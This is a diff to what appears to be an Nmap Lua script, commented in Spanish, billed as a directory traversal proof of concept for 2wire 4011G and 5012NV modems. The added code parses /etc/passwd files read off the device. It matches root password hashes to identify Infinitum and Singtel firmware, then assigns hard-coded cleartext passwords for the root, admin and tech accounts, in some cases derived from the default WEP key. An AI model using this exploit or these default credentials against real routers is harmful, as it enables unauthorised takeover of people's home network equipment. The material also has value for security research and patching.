@@ -1,5 +1,5 @@
 description = [[
-2wire 4011G and 5012NV Directory Traversal Vulnerability PoC v2.
+2wire 4011G and 5012NV Directory Traversal Vulnerability PoC v2.5
 
 Afecta a estos modems y posiblemente otros con firmware 9.x.x.x
 
@@ -260,15 +260,19 @@ local function sacar_info (tabla)
 	end
 	
 	if tabla.archivos["/etc/passwd"] then
-		--Solo si es Infinitum muestra los otros usuarios
-		info = string.find(tabla.archivos["/etc/passwd"],"root:$1$$spzFI9bag88XMcBWdGNMh")
-		if info then
+		info = string.match(tabla.archivos["/etc/passwd"],"root:(.-):")
+		--Si es modem Infinitum ...		
+		if info and info == "$1$$spzFI9bag88XMcBWdGNMh/" then
 			tabla.usuarios.root = "b3str3ss"
 			info = string.match(tabla.archivos["/etc/passwd"],"admin:(.-):")
 			if info and info == string.match(tabla.archivos["/etc/passwd"],"tech:(.-):")  then
 				tabla.usuarios.admin = tabla.default_wepkey1
 			end
 			tabla.usuarios.tech = tabla.default_wepkey1
+		--Si es Singtel ...
+		elseif info and info == "$1$$Zw8ZNiDa1HCLFOoDPu0hr." then
+			tabla.usuarios.root = "s1ngt3l2w1r3"
+			tabla.usuarios.tech = "techsupport" --$1$$Rg2OibVvUTim2uPK4worH1
 		end
 	end
 
